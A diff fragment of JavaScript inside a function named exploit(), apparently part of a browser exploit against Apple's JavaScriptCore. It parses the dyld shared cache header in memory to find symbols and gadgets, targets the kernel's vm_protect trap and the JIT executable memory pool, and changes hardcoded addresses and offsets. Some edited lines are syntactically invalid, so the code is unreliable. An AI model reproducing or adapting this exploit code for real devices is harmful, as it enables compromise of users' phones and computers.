@@ -681,8 +681,8 @@ function exploit(){
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
             "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
             "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
-                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
-                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC32startOfFixedExecutableMemoryPoolE":0x1BA3550C0,
+                "__ZN3JSC30endOfFixedExecutableMemoryPoolE":0x1BA3550C8,
             ],
         };
 
@@ -717,13 +717,13 @@ function exploit(){
         var syms = {};
         var gadgets = {};
       //  alert("dyld base address" + memory.u32(hdr + 0x20))
-        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x88)));
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
         //alert("imgs"+imgs)
         var nimgs = memory.u32(Add(hdr, 0x1c));
         //alert(nimgs + "n")
         for(var i = 0; i < nimgs; ++i)
         {
-            var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x1c)));
+            var straddr = off2addr(segs, memory.u32(Add(imgs,i * 0x20 + 0x18)));
             var fn = function(i,oz)
             {  if(oz) { return memory.read(Add(straddr, i), 0x10);
             }
